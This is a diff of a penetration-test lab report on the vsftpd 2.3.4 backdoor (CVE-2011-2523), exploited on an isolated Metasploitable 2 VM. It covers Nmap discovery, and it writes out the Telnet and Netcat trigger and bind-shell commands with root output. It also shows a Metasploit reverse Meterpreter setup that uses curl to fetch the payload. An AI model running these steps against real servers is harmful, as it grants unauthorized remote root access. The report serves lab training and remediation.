@@ -1,304 +1,118 @@
-# VULN-001 — vsftpd 2.3.4 Backdoor Command Execution
+# VULN-001 — vsftpd 2.3.4 Backdoor
 
-> **CONFIRMED: CVE-2011-2523 — manual exploitation succeeded on 28 November 2026.** Backdoor triggered over FTP port 21; TCP 6200 opened and executed `id` and `whoami` as `root`. **Metasploit root Meterpreter session confirmed at 10:59:54 +0530 on 28 November 2026.**
->
-> [← Project home](../../../README.md) · [← Candidate index: NET-001](../../../FINDINGS-INDEX.md#net-001) · [Lab setup](../../../lab-setup/README.md)
+**Confirmed · Critical (CVSS 9.8) · CVE-2011-2523**
 
-## 1. Finding information
+[← Project home](../../../README.md) · [Finding index](../../../FINDINGS-INDEX.md#net-001) · [Evidence folder](screenshots/)
 
-| Field | Detail |
+## 1. Finding summary
+
+| Item | Details |
 | --- | --- |
-| Finding ID | `VULN-001` |
-| Catalog ID | `NET-001` |
-| Name | vsftpd 2.3.4 malicious backdoor |
-| Categories | `BD` Backdoors · `RCE` Remote Code Execution |
-| CVE | [CVE-2011-2523](https://nvd.nist.gov/vuln/detail/CVE-2011-2523) |
-| CWE | [CWE-78](https://cwe.mitre.org/data/definitions/78.html) (NVD classification); supply-chain compromise / hidden functionality is additional context |
-| Published CVSS v3.1 | **9.8 Critical** ([NVD](https://nvd.nist.gov/vuln/detail/CVE-2011-2523)) |
-| Target | Metasploitable 2 — `192.168.95.131` (Kali `192.168.95.128`) |
-| Service | FTP, TCP 21 |
-| Backdoor listener | TCP 6200 |
-| Possible impact | Unauthenticated **root** command execution |
-| Local validation | **Confirmed — root command execution via backdoor port 6200** |
-| Manual testing | **Successful — Telnet FTP trigger + Netcat shell** |
-| Metasploit testing | **Successful — root Meterpreter session 1** |
-| Test date / evidence | **2026-11-28** confirmed manual exploit; [trigger screenshot](screenshots/03-Manual-FTP-Backdoor-Trigger.png), [root proof screenshot](screenshots/04-Manual-Root-Shell-Proof.png), [terminal transcript](scans/04-Manual-vsftpd-Root-Shell.txt) |
+| Finding / catalog ID | `VULN-001` / `NET-001` |
+| Vulnerability | Backdoored vsftpd 2.3.4 source distribution |
+| Classification | `BD` Backdoor · `RCE` Remote Code Execution |
+| CVE / CWE | [CVE-2011-2523](https://nvd.nist.gov/vuln/detail/CVE-2011-2523) · [CWE-78](https://cwe.mitre.org/data/definitions/78.html) |
+| Severity | **Critical — CVSS v3.1: 9.8** (published NVD score) |
+| Attacker / target | Kali `192.168.95.128` → Metasploitable 2 `192.168.95.131` |
+| Affected ports | FTP `21/tcp` · backdoor shell `6200/tcp` |
+| Date | **28 November 2026** |
+| Manual testing | **Confirmed — root shell** |
+| Metasploit testing | **Confirmed — root Meterpreter session** |
 
-## 2. Explanation and historical incident
+**Result:** A crafted FTP username triggered the backdoor. The target accepted unauthenticated commands as `root`. Both manual and Metasploit testing independently confirmed successful exploitation.
 
-**vsftpd** is the *Very Secure FTP Daemon*, a file transfer server for Unix/Linux. During **June 30–July 3, 2011**, a maliciously altered copy of the `vsftpd-2.3.4.tar.gz` source archive was distributed from a compromised download site. The software author, Chris Evans, disclosed the incident on **July 3, 2011**; it became a security advisory in early July. This is a **software supply-chain compromise**, not evidence that every legitimate vsftpd 2.3.4 build was malicious.
+## 2. Background and history
 
-When a vulnerable FTP service receives a username containing the sequence ` :)` (specifically, the characters `:)`), the malicious code can activate a **bind shell on TCP 6200**. An attacker reaching that listener may execute operating-system commands with root privileges without knowing a valid FTP password.
+**vsftpd** (Very Secure FTP Daemon) is a Linux/Unix FTP server. In **2011**, attackers compromised a distribution of the vsftpd 2.3.4 source archive and inserted a backdoor. The project author disclosed the incident on **3 July 2011**. This is an example of a **software supply-chain compromise**: not every legitimate vsftpd 2.3.4 build contained the backdoor.
 
-```text
-Kali Linux (tester)        Metasploitable 2 (isolated target)
-   FTP request  ─────────► FTP service :21
-   USER lab:)   ─────────► Tampered code triggers
-                           Bind shell appears on :6200
-   TCP :6200    ─────────► Shell
-   id            ─────────► Potential uid=0(root)
-```
+In the affected build, an FTP username ending with ` :)` (the characters `:)`) can activate a shell on TCP port **6200**. The lab demonstrated root-level access without valid FTP credentials. See [NVD](https://nvd.nist.gov/vuln/detail/CVE-2011-2523) and [original disclosure](https://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html).
 
-**Technical distinction:** a version banner saying `vsFTPd 2.3.4` is an investigation lead, not conclusive proof of the backdoored build. Test the actual behavior.
+## 3. Reconnaissance and enumeration
 
-## 3. Risk and impact
+### 3.1 FTP discovery
 
-The published NVD severity is **CVSS 3.1 = 9.8 (Critical)**. Exploitation can compromise **confidentiality** (read sensitive files), **integrity** (modify files or settings), and **availability** (disrupt services). The malicious bind shell bypasses normal FTP authentication. In a training lab, use only non-destructive verification commands.
-
-## 4. Lab preparation and service discovery
-
-**Run only from Kali against the IP address of your own isolated Metasploitable 2 VM.**
-
-```bash
-# On the Metasploitable 2 console
-ifconfig
-
-# On Kali
-ip -4 addr
-
-# In a local clone, from the project root
-TARGET=<YOUR_METASPLOITABLE_2_IP>
-ping -c 3 "$TARGET"
-sudo nmap -sV -p 21 -oN vulnerabilities/network/VULN-001-vsftpd-backdoor/scans/01-ftp-version.nmap "$TARGET"
-```
-
-**Expected investigative clue, not observed output:**
-```text
-21/tcp open ftp vsftpd 2.3.4
-```
-
-**Baseline result (2026-11-27):** Nmap 7.99 reports `21/tcp open ftp vsftpd 2.3.4` and `ftp-anon: Anonymous FTP login allowed (FTP code 230)`. See the [real scan summary](../../../lab-setup/OPEN-PORTS.md). A focused FTP scan and actual screenshot remain pending; save them to `screenshots/01-ftp-enumeration.png`.
-
-### 4.1 Focused FTP scan — actual results (28 November 2026)
-
-**Command executed on Kali:**
+**Kali command:**
 ```bash
 sudo nmap -sV -sC -p 21 192.168.95.131
 ```
 
-**Observed evidence (Nmap 7.99, 2026-11-28 10:03 +0530):**
-```text
-Host is up (0.0023s latency).
-21/tcp open  ftp  vsftpd 2.3.4
-|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
-Nmap done: 1 IP address (1 host up) scanned in 2.81 seconds
-```
+**Observed:** `21/tcp open ftp vsftpd 2.3.4`; Nmap also reported anonymous FTP login allowed (`230`). See [scan transcript](scans/01-FTP-Service-Discovery.txt).
 
-The `ftp-syst` response additionally reports a connection from `192.168.95.128`, ASCII transfer mode, and **plaintext control and data connections**. These results are **service enumeration**, not evidence that the malicious backdoor has been activated.
+![01 — FTP service discovery](screenshots/01-FTP-Service-Discovery.png)
 
-**Evidence:**
-- [01 — FTP discovery terminal transcript](scans/01-FTP-Service-Discovery.txt), transcribed from the user's terminal output
-- [01 — Actual FTP service discovery screenshot](screenshots/01-FTP-Service-Discovery.png), uploaded and embedded below
-- [Full-host initial reconnaissance](../../../lab-setup/OPEN-PORTS.md)
-
-![Actual focused Nmap scan identifying vsftpd 2.3.4 and anonymous FTP](screenshots/01-FTP-Service-Discovery.png)
-
-**Current state:** Both manual and Metasploit methods confirmed root-level code execution on 28 November 2026.
-
-### 4.2 Pre-exploitation TCP 6200 check — actual result (28 November 2026)
-
-**Kali command executed:**
+### 3.2 Check the backdoor port before exploitation
 
 ```bash
 nc -nvz 192.168.95.131 6200
 ```
 
-**Observed output:**
+**Observed:** `Connection refused` — the backdoor listener was not available at this point. See [baseline output](scans/02-Pre-Exploit-Port-6200-Check.txt).
+
+![02 — Port 6200 before exploitation](screenshots/02-Pre-Exploit-Port-6200.png)
+
+### 3.3 Anonymous FTP access
 
 ```text
-(UNKNOWN) [192.168.95.131] 6200 (?) : Connection refused
-```
-
-**Interpretation:** TCP 6200 was **not accepting connections** at the time of this check, before any documented backdoor trigger. This is a useful baseline, **not evidence that CVE-2011-2523 is present or absent**. The next step is normal FTP enumeration on port 21.
-
-**Evidence:** [Pre-exploit TCP 6200 terminal output](scans/02-Pre-Exploit-Port-6200-Check.txt). The original screenshot was supplied in the conversation on 28 November 2026; a GitHub image link will be added only after a binary upload is confirmed.
-
-### 4.3 Anonymous FTP enumeration — actual result (28 November 2026)
-
-**General command:** `ftp -inv <TARGET_IP>`  
-**Command used on Kali:** `ftp -inv 192.168.95.131`
-
-**Observed commands and significant replies:**
-
-```text
-220 (vsFTPd 2.3.4)
+ftp -inv 192.168.95.131
 ftp> user anonymous anonymous@example.com
-331 Please specify the password.
 230 Login successful.
 ftp> pwd
 Remote directory: /
 ftp> ls
-229 Entering Extended Passive Mode (|||24487|).
-150 Here comes the directory listing.
 226 Directory send OK.
-ftp> quit
-221 Goodbye.
 ```
 
-**Interpretation:** Anonymous FTP login was **confirmed successful** (`230`). The working directory was `/`; the directory listing completed successfully (`226`) but **no files or directories were displayed** in this session. This demonstrates anonymous access, **not file upload permissions or exploitation of CVE-2011-2523**.
+**Observed:** Anonymous authentication succeeded; the directory listing completed with no file names shown. This is separate from the backdoor. See [FTP transcript](scans/03-Anonymous-FTP-Enumeration.txt).
 
-**Real screenshot evidence:** [02-FTP-Enumeration.png](screenshots/02-FTP-Enumeration.png) — compressed PNG representation of the supplied original screenshot, with no synthetic terminal output.
+![03 — Anonymous FTP enumeration](screenshots/02-FTP-Enumeration.png)
 
-![Observed anonymous FTP login, pwd and ls](screenshots/02-FTP-Enumeration.png)
+## 4. Manual exploitation — confirmed
 
-**Terminal transcription:** [03-Anonymous-FTP-Enumeration.txt](scans/03-Anonymous-FTP-Enumeration.txt).
+**Method:** Telnet FTP trigger followed by Netcat connection to the backdoor.
 
-**Next step:** Manually trigger the backdoor on TCP 21 and independently check whether TCP 6200 opens on the isolated training VM.
-
-## 5. Confirmed manual exploitation — Telnet + Netcat (28 November 2026)
-
-**Actual workflow executed on Kali** against the authorized isolated Metasploitable 2 target `192.168.95.131`:
-
-### 5.1 Before triggering — TCP 6200 refused connections
-
-```bash
-nc -nvz 192.168.95.131 6200
-```
-```text
-(UNKNOWN) [192.168.95.131] 6200 (?) : Connection refused
-```
-
-### 5.2 Trigger the backdoor through FTP port 21
-
+**Terminal 1 — send the FTP trigger:**
 ```bash
 telnet 192.168.95.131 21
 ```
 ```text
-Connected to 192.168.95.131.
-220 (vsFTPd 2.3.4)
 USER lab:)
 331 Please specify the password.
 PASS test
 ```
 
-The supplied screenshot ends after `PASS test`; no subsequent FTP reply is visible. The username's `:)` is the historical backdoor trigger.
+![04 — Manual FTP backdoor trigger](screenshots/03-Manual-FTP-Backdoor-Trigger.png)
 
-![Actual Telnet FTP backdoor trigger — screenshot from Kali](screenshots/03-Manual-FTP-Backdoor-Trigger.png)
-
-[View original-terminal screenshot evidence, cropped and converted to black/white for readability](screenshots/03-Manual-FTP-Backdoor-Trigger.png)
-
-### 5.3 Connect to the opened bind shell (Netcat)
-
+**Terminal 2 — connect to the shell:**
 ```bash
 nc -nv 192.168.95.131 6200
 ```
-
-**Actual observed results:**
-
 ```text
 (UNKNOWN) [192.168.95.131] 6200 (?) open
 id
 uid=0(root) gid=0(root)
 whoami
 root
-ls
-bin
-boot
-cdrom
-dev
-etc
-home
-...
 ```
 
-The screenshot also shows other system-directory names. **Root privileges were verified** using actual `id` and `whoami` output. No command to create users, alter files, download secrets, or establish persistence is visible.
+![05 — Manual root-shell verification](screenshots/04-Manual-Root-Shell-Proof.png)
 
-![Actual root bind-shell proof with id and whoami results](screenshots/04-Manual-Root-Shell-Proof.png)
+**Conclusion:** TCP 6200 was closed before the trigger and opened afterward. The `id` and `whoami` results prove **remote root command execution**. Full observed output: [manual test transcript](scans/04-Manual-vsftpd-Root-Shell.txt).
 
-[View root-shell proof screenshot](screenshots/04-Manual-Root-Shell-Proof.png) · [Read the transcribed exploitation output](scans/04-Manual-vsftpd-Root-Shell.txt)
+<details>
+<summary>Other manual techniques (research only — not tested on this VM)</summary>
 
-### 5.4 Validation conclusion
+The same FTP trigger can be sent through Netcat, Socat, or Python sockets. A local [Python PoC](scripts/manual_vsftpd_backdoor.py) is available but has **not** been executed as part of this report. Nmap also provides an intrusive [ftp-vsftpd-backdoor NSE script](https://nmap.org/nsedoc/scripts/ftp-vsftpd-backdoor.html). These are **alternative methods for this same CVE**, not additional confirmed exploits.
 
-**Confirmed:** The observed pre-trigger refusal on TCP 6200, subsequent FTP trigger with `USER lab:)`, successful TCP 6200 connection, and `uid=0(root)` establish successful manual exploitation of the vsftpd 2.3.4 backdoor in this isolated VM.
+</details>
 
-**Impact demonstrated:** Unauthenticated remote command execution with root privileges. The potential impact includes complete confidentiality, integrity and availability compromise; this controlled demonstration did **not** test data theft, persistence, service disruption, or lateral movement.
+## 5. Metasploit exploitation — confirmed
 
-**Method limitations:** This confirms the Telnet + Netcat path only. The Python, Socat, Nmap NSE, and Metasploit alternatives are **not yet tested**.
+**Module:** `exploit/unix/ftp/vsftpd_234_backdoor`  
+**Target:** `0 — Linux/Unix Command` (the only target shown by the installed module)  
+**Payload:** `cmd/linux/http/x86/meterpreter_reverse_tcp`
 
-### 5.5 Manual method steps for reproduction
+### 5.1 Module selection and options
 
-General commands, where `<TARGET_IP>` is the private VM address:
-
-```bash
-telnet <TARGET_IP> 21
-# Enter at the FTP prompt:
-# USER lab:)
-# PASS test
-```
-
-In a second Kali terminal:
-
-```bash
-nc -nv <TARGET_IP> 6200
-# Then: id, whoami
-```
-
-**Reset the target VM from a snapshot before attempting a different method**, to prevent an existing bind shell from being mistaken for a newly triggered backdoor.
-
-## 6. Manual exploitation — Method B: Netcat
-
-To ensure FTP commands contain the proper CRLF line endings:
-
-```bash
-printf 'USER lab:)\r\nPASS test\r\n' | nc -nv -w 4 "$TARGET" 21
-```
-
-Then connect to the newly created shell listener:
-
-```bash
-nc -nv "$TARGET" 6200
-```
-
-Enter `id`, `whoami`, `hostname`, and `exit` interactively. A blank prompt can be normal for this raw command shell.
-
-## 7. Manual exploitation — Method C: Python 3 sockets
-
-Python reproduces the FTP protocol interaction directly, without Metasploit:
-
-```bash
-python3 vulnerabilities/network/VULN-001-vsftpd-backdoor/scripts/manual_vsftpd_backdoor.py "$TARGET"
-```
-
-See [the reviewed Python source](scripts/manual_vsftpd_backdoor.py). It sends the backdoor trigger, checks TCP 6200 and runs only `id`. It does not upload files, persist access, or alter the target. Verify the output yourself.
-
-## 8. Manual exploitation — Method D: Socat / raw TCP clients
-
-If `socat` is installed, it can be used like Telnet or Netcat:
-
-```bash
-socat - TCP:"$TARGET":21
-```
-
-Type `USER lab:)` and `PASS test`. In a second Kali terminal:
-
-```bash
-socat - TCP:"$TARGET":6200
-```
-
-Enter `id` and `exit`. **FTP clients and TCP libraries are different ways to trigger the same backdoor**, not separate CVEs.
-
-## 9. Automated validation without Metasploit — Nmap NSE
-
-Nmap has an official script which **actively triggers and checks the backdoor**, running a harmless `id` command. Unlike a simple version scan, this is an **intrusive validation test**, so use it only on your VM.
-
-```bash
-sudo nmap -p 21 --script ftp-vsftpd-backdoor \
-  -oN vulnerabilities/network/VULN-001-vsftpd-backdoor/scans/02-nse-validation.nmap "$TARGET"
-```
-
-If the script reports `VULNERABLE (Exploitable)` and shows actual `uid=` output, preserve the result. [Nmap script documentation](https://nmap.org/nsedoc/scripts/ftp-vsftpd-backdoor.html).
-
-## 10. Metasploit Framework — successful independent validation (28 November 2026)
-
-**Result: CONFIRMED — a Meterpreter session opened and `getuid` returned `root`.**
-
-### 10.1 Prior check and module selection
-
-The tester first confirmed that TCP 6200 was not accepting connections after the target reset.
-
-![Actual TCP 6200 connection-refused baseline](screenshots/02-Pre-Exploit-Port-6200.png)
-
-The matching Metasploit module was selected:
 ```text
 msfconsole -q
 search vsftpd
@@ -309,28 +123,16 @@ show targets
 show options
 ```
 
-The tester's installed framework displayed only **Target 0: Linux/Unix Command**; the selected payload was `cmd/linux/http/x86/meterpreter_reverse_tcp`. No additional target was assumed.
+<details>
+<summary>View original module and initial options screenshots</summary>
 
-![Actual Metasploit module search and target-selection screenshot](screenshots/05-Metasploit-Module-and-Targets.png)
+![06 — Selected Metasploit module and available target](screenshots/05-Metasploit-Module-and-Targets.png)
 
-### 10.2 Configured options
+![07 — Initial Metasploit module options](screenshots/06-Metasploit-Options-Before-LHOST.png)
 
-Before setting `LHOST`, the real `show options` screen showed the current fetch-based Meterpreter payload and an unset required listener address.
+</details>
 
-![Actual initial Metasploit show options before LHOST was set](screenshots/06-Metasploit-Options-Before-LHOST.png)
-
-| Option | Verified setting |
-| --- | --- |
-| `RHOSTS` | `192.168.95.131` |
-| `RPORT` | `21` |
-| `TARGET` | `0 — Linux/Unix Command` |
-| `PAYLOAD` | `cmd/linux/http/x86/meterpreter_reverse_tcp` |
-| `FETCH_COMMAND` | `CURL` |
-| `FETCH_SRVPORT` | `8080` |
-| `LHOST` | `192.168.95.128` (Kali) |
-| `LPORT` | `4444` |
-
-The tester set and reviewed the reverse connection address and port:
+### 5.2 Reverse listener configuration
 
 ```text
 set LHOST 192.168.95.128
@@ -339,101 +141,64 @@ show options
 run
 ```
 
-![Actual LHOST and LPORT command setup](screenshots/07-Metasploit-LHOST-LPORT-Commands.png)
+| Option | Value |
+| --- | --- |
+| `RHOSTS` / `RPORT` | `192.168.95.131` / `21` |
+| `LHOST` / `LPORT` | `192.168.95.128` / `4444` |
 
-The configured `show options` output confirms `LHOST=192.168.95.128` and `LPORT=4444`.
+<details>
+<summary>View original listener and final configuration screenshots</summary>
 
-![Actual final Metasploit show options after setting LHOST and LPORT](screenshots/08-Metasploit-Configured-Options.png)
+![08 — LHOST and LPORT commands](screenshots/07-Metasploit-LHOST-LPORT-Commands.png)
 
-Previous `show options` values were transcribed from the supplied Kali screenshot in [05-Metasploit-Show-Options.txt](scans/05-Metasploit-Show-Options.txt).
+![09 — Configured Metasploit options](screenshots/08-Metasploit-Configured-Options.png)
 
-### 10.3 Actual exploitation result
+</details>
 
-The screenshot displays the following important output:
+### 5.3 Session and root verification
 
+**Actual observed output:**
 ```text
-[*] Started reverse TCP handler on 192.168.95.128:4444
-[*] 192.168.95.131:21 - Running automatic check
-[+] 192.168.95.131:21 - The target appears to be vulnerable
-[+] 192.168.95.131:21 - Backdoor has been spawned!
-[*] Meterpreter session 1 opened (192.168.95.128:4444 -> 192.168.95.131:40449) at 2026-11-28 10:59:54 +0530
+[+] Backdoor has been spawned!
+[*] Meterpreter session 1 opened
+    (192.168.95.128:4444 -> 192.168.95.131:40449)
+    at 2026-11-28 10:59:54 +0530
+
 meterpreter > getuid
 Server username: root
+
 meterpreter > sysinfo
 Computer     : metasploitable.localdomain
 OS           : Ubuntu 8.04 (Linux 2.6.24-16-server)
 Architecture : i686
-BuildTuple   : i486-linux-musl
 Meterpreter  : x86/linux
-meterpreter > pwd
-/
-meterpreter > ls
-Listing: /
 ```
 
-The directory listing in the original screenshot includes `bin`, `boot`, `dev`, `etc`, `home`, and `root`. The demonstration did not require collecting private file contents or changing accounts.
+The screenshot also shows `pwd` returning `/` and a root-directory listing.
 
-![Genuine Meterpreter session opened with root getuid and Ubuntu sysinfo](screenshots/09-Metasploit-Root-Session.png)
+![10 — Successful root Meterpreter session](screenshots/09-Metasploit-Root-Session.png)
 
-**Image note:** Uploaded screenshot is a cropped monochrome representation of the original Kali terminal image; all visible terminal text comes from the actual session.
+**Conclusion:** Metasploit independently triggered the vulnerable service and created a **root Meterpreter session**. The selected fetch-based Meterpreter payload succeeded in this specific lab.
 
-### 10.4 Metasploit impact and conclusion
+## 6. Security impact and remediation
 
-**Confirmed:** The Metasploit exploit triggered the vsftpd backdoor, established Meterpreter session 1, and executed commands with **root** privileges. The demonstration independently corroborates the earlier successful Telnet/Netcat validation.
-
-**Special note:** Although a modern fetch-delivered Meterpreter payload may be incompatible with some very old Linux systems, **this payload worked on this user's actual lab configuration**. Record actual evidence instead of assuming a historical compatibility limitation will always cause failure.
-
-**Scope:** No persistence, additional target discovery, credential dumping, or destructive actions were documented. Restore the vulnerable VM snapshot after the exercise.
-
-## 11. Troubleshooting
-
-| Symptom | Possible explanation / next step |
+| Security property | Impact |
 | --- | --- |
-| TCP 21 closed | Wrong VM IP, network isolation mismatch, or FTP service not running |
-| Banner not vsftpd 2.3.4 | Different FTP service/build; verify before proceeding |
-| Port 6200 closed | Trigger didn't activate, listener closed, firewall or target mismatch |
-| Port 6200 already open | Earlier exploit may have left the shell listening; connect carefully or reset VM |
-| Shell connects but shows no prompt | Raw bind shells often have no friendly prompt; enter `id` |
-| Metasploit runs but no session | Inspect `show targets` and prefer `Backdoor Command Shell` (usually target 1), rather than legacy-incompatible Meterpreter fetch |
-| `cmd/unix/interact` not valid | Select the `Backdoor Command Shell` target first; an older module may lack this target |
-| Nmap NSE succeeds but manual fails | Script may have triggered and consumed an existing single-use listener; reset before another attempt |
+| Confidentiality | Root can read files and sensitive data |
+| Integrity | Root can change system settings, software, or data |
+| Availability | Root can stop services or disrupt the operating system |
+| Access control | Remote root execution without valid FTP authentication |
 
-## 12. Remediation / verification
+**Observed impact:** Root-level command execution and directory enumeration. **Not performed:** credential extraction, persistence, data modification, destructive commands, or lateral movement.
 
-In a genuine environment: remove compromised binaries, reinstall from a trusted and integrity-verified source, check build/package provenance, rotate credentials if exposure is suspected, investigate possible compromise and unauthorized ports, restrict FTP access, and prefer maintained encrypted transfer alternatives (such as SFTP). For this lab, preserve vulnerability evidence and restore the VM snapshot after testing.
+**Recommended remediation:** Remove the compromised software, reinstall a verified trusted build, investigate possible compromise, restrict exposed FTP services, and use a maintained encrypted alternative such as SFTP. In this intentionally vulnerable lab, **restore the VM snapshot** after testing.
 
-## 13. Screenshot and evidence checklist
+## 7. Evidence and references
 
-The report embeds the available real evidence **in the order it was collected**:
+All ten tester-supplied screenshots are embedded above in their relevant stages. Raw or transcribed terminal outputs are saved in [`scans/`](scans/) and the image files in [`screenshots/`](screenshots/).
 
-| Step | Screenshot / record | Status |
-| --- | --- | --- |
-| 1. Service discovery | `01-FTP-Service-Discovery.png` | Uploaded |
-| 2. Port 6200 baseline | [`02-Pre-Exploit-Port-6200.png`](screenshots/02-Pre-Exploit-Port-6200.png) | Uploaded |
-| 3. Anonymous FTP enumeration | [`02-FTP-Enumeration.png`](screenshots/02-FTP-Enumeration.png) | Uploaded |
-| 4. Manual trigger | [`03-Manual-FTP-Backdoor-Trigger.png`](screenshots/03-Manual-FTP-Backdoor-Trigger.png) | Uploaded |
-| 5. Manual root-shell proof | [`04-Manual-Root-Shell-Proof.png`](screenshots/04-Manual-Root-Shell-Proof.png) | Uploaded |
-| 6. Metasploit module/targets | `05-Metasploit-Module-and-Targets.png` | Uploaded |
-| 7. Initial Metasploit options | `06-Metasploit-Options-Before-LHOST.png` | Uploaded |
-| 8. LHOST/LPORT configuration | [`07-Metasploit-LHOST-LPORT-Commands.png`](screenshots/07-Metasploit-LHOST-LPORT-Commands.png) | Uploaded |
-| 9. Final Metasploit options | `08-Metasploit-Configured-Options.png` | Uploaded |
-| 10. Root Meterpreter session | [`09-Metasploit-Root-Session.png`](screenshots/09-Metasploit-Root-Session.png) | Uploaded |
-
-**Terminal evidence:** [FTP discovery](scans/01-FTP-Service-Discovery.txt) · [Port 6200 baseline](scans/02-Pre-Exploit-Port-6200-Check.txt) · [Anonymous FTP](scans/03-Anonymous-FTP-Enumeration.txt) · [Manual root shell](scans/04-Manual-vsftpd-Root-Shell.txt) · [Metasploit pre-exploit options](scans/05-Metasploit-Show-Options.txt).
-
-Screenshots are derived from the tester's original uploads, with high-contrast cropping/compression for legibility. No simulated console output is presented as evidence.
-
-## 14. References
-
-1. [NVD — CVE-2011-2523](https://nvd.nist.gov/vuln/detail/CVE-2011-2523)
-2. [Rapid7 — Metasploitable 2 exploitability guide](https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide/)
-3. [HKCERT — 2011 compromised vsftpd source package bulletin](https://www.hkcert.org/security-bulletin/vsftpd-compromised-source-packages-backdoor-vulnerability)
-4. [Nmap — ftp-vsftpd-backdoor NSE documentation](https://nmap.org/nsedoc/scripts/ftp-vsftpd-backdoor.html)
-5. [Rapid7 — Metasploit vsftpd module source](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb)
-6. [Metasploit issue #21780 — modern payload incompatibility](https://github.com/rapid7/metasploit-framework/issues/21780)
-7. [Metasploit PR #21792 — proposed compatibility fix (not merged)](https://github.com/rapid7/metasploit-framework/pull/21792)
-8. [Original author's historical disclosure](https://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html)
+**References:** [NVD CVE-2011-2523](https://nvd.nist.gov/vuln/detail/CVE-2011-2523) · [Rapid7 Metasploitable 2 guide](https://docs.rapid7.com/metasploit/metasploitable-2-exploitability-guide/) · [Metasploit module](https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb) · [Nmap NSE documentation](https://nmap.org/nsedoc/scripts/ftp-vsftpd-backdoor.html)
 
 ---
 
-**FINAL RESULT: CONFIRMED — CRITICAL (2026-11-28).** Both manual Telnet/Netcat and Metasploit independently demonstrated root-level remote command execution.
+**Assessment verdict: CONFIRMED — Critical.** Manual and Metasploit exploitation both demonstrated root-level remote code execution on the authorized isolated target.
